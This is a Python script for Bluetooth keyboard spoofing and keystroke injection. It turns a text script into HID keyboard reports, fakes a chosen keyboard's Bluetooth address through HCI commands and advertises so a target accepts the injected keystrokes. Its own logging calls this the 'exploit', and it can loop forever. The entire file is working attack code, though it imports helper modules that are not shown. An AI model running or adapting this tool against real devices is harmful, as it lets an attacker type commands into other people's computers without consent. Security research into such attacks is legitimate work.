#!/usr/bin/python3
import os
import argparse
import sys
import logging
from HIDMapping import *
from kb_injection_aux import *
import json
import struct

# SPECIAL CHARACTERS
INIT_CMD    = '{'
END_CMD     = '}'
KEY_UNION   = '+'

####
# FUNCION DEFINITIONS
##
def text2tokens(text_script: str):
    
    reading_spc=False
    append_next=False
    spc=''
    token_list = []
    tokens=[]

    for char in text_script:
        if not reading_spc:
            if append_next:
                if char == KEY_UNION: # case ++ -> +
                    append_next=False
                    token_list.append(tokens)
                    tokens = [char]
                    token_list.append(tokens)

                else:
                    #append next
                    tokens.append(char)
                    token_list.append(tokens)
                    append_next=False

                continue

            if char == INIT_CMD:
                #process {
                reading_spc=True
                spc=char

            elif char == KEY_UNION:
                #process +
                tokens=token_list.pop()
                append_next=True

            else:
                #process char
                tokens=[char]
                token_list.append(tokens)
        else:
            spc +=char
            if char == END_CMD:
                #process }
                reading_spc=False
                tokens=[spc]
                token_list.append(tokens)
            elif char == INIT_CMD: # case {{ -> {
                reading_spc=False
                tokens=[char]
                token_list.append(tokens)

    return token_list

def padd(report):
    while len(report)<lk_g_config['REPORT_SIZE']:
        report.append(0)
    return report

def tokens2report(tokens, hidmap=HIDMapping('es')):
    report = []
    modifiers={}
    keys=[]
    for token in tokens:
        logging.debug("Processing token: " + str(token))
        if token.startswith('{'):
            spc=token[1:-1]
            if spc in hid_map:
                modifiers[spc] = True
            elif spc in hid_common:
                keys.append(spc)
            else:
                #print("Function: " + spc)
                cmd_parts = spc.split(' ')
                if cmd_parts[0] in CMD_CB_LIST.keys():
                    try:
                        report = [255]
                        report.extend(CMD_CB_LIST[cmd_parts[0]](500))
                    except:
                        logging.error("Bad Return")
                        return None    
                else:
                    logging.error("Error: Function not found!")
                    return None
                return padd(report)
        else:
            keys.append(token)

    report = []
    hid,mod = hidmap.getHIDCodeFromKey("", modifiers)
    report.append(mod)

    for key in keys:
        hid,mod = hidmap.getHIDCodeFromKey(key)
        report[0] = report[0] | mod
        report.append(hid)
    
    # padding
    logging.debug("Resulting report (no padded) " + str(report))
    return padd(report)

def runHCICommand(command: str, norun: bool):
    if (norun):
        logging.debug("Printing command: " + command)
        print(command)
    else:
        logging.debug("Running command: " + command)
        os.system(command)

####
# GLOBAL VARIABLES
##
CMD_CB_LIST = {}

####
# COMMAND DEFINITIONS
##
def sleep(args):
    #print("Arg: " + str(args))
    f_opcode    = [0x01]
    f_arg_pack  = list(struct.pack('I', 500))
    ret = f_opcode
    ret.extend(f_arg_pack)
    return ret

CMD_CB_LIST["SLEEP"] = sleep

####
# MAIN
##

parser = argparse.ArgumentParser(description='WKI configuration and execution tool.')
parser.add_argument('-i', '--hci',      help='HCI Device', required=True)
parser.add_argument('-m', '--bdaddr',   help='Keyboard BDADDR to be faked. Format: XX:XX:XX:XX:XX:XX', required=True)
parser.add_argument('-c', '--conf_file',help='Configuration file', required=True)
parser.add_argument('-n', '--no-act',   help='Print commands only, without running them', required=False, action='store_true', default=False)
parser.add_argument('-r', '--run-forever', help='Run key loop. Key Injection secuence starts again on end', required=False, action='store_true', default=False)

args = parser.parse_args()

#if (args.help):
#    parser.print_help()

logging.basicConfig(stream=sys.stderr, level=logging.INFO, format='%(asctime)s [%(levelname)7s] %(message)s')

logging.debug("Input arguments: " + str(args))

with open(args.conf_file) as json_file:
    lk_g_config = json.load(json_file)

logging.debug("Input configuration from file: " + str(lk_g_config))

logging.debug("Text script to process: " + lk_g_config['TEXT_SCRIPT'])
token_list = text2tokens(lk_g_config['TEXT_SCRIPT'])

logging.debug("Token list: " + str(token_list))

report_list = []
for tokens in token_list:
    report = tokens2report(tokens)
    logging.debug("Appenning report: " + str(report))
    report_list.append(report)

cmd_builder = COMMAND_BUILDER(args.hci)

logging.info("Initializing device...")

runHCICommand(cmd_builder.cmd_start_advertising(False), args.no_act)

runHCICommand(cmd_builder.cmd_dev_down(), args.no_act)

runHCICommand(cmd_builder.cmd_dev_up(), args.no_act)

logging.info("Configuring advertising info...")
logging.info("\tMAC: " + args.bdaddr)

runHCICommand(cmd_builder.cmd_set_adv_param(), args.no_act)

runHCICommand(cmd_builder.cmd_set_random_addr(args.bdaddr), args.no_act)

logging.info("Configuring exploit data...")
runHCICommand(cmd_builder.cmd_setup_all(lk_g_config['REPORT_HANDLE'], lk_g_config['REPORT_SIZE'], lk_g_config['REPORT_OPTYPE']), args.no_act)

runHCICommand(cmd_builder.cmd_actions_clean(), args.no_act)

for report in report_list:
    runHCICommand(cmd_builder.cmd_actions_add(report), args.no_act)

if(args.run_forever):
    logging.info("Run forever enabled.")
    runHCICommand(cmd_builder.cmd_actions_run_forever(), args.no_act)

logging.info("Start exploit!")
runHCICommand(cmd_builder.cmd_start_advertising(), args.no_act)
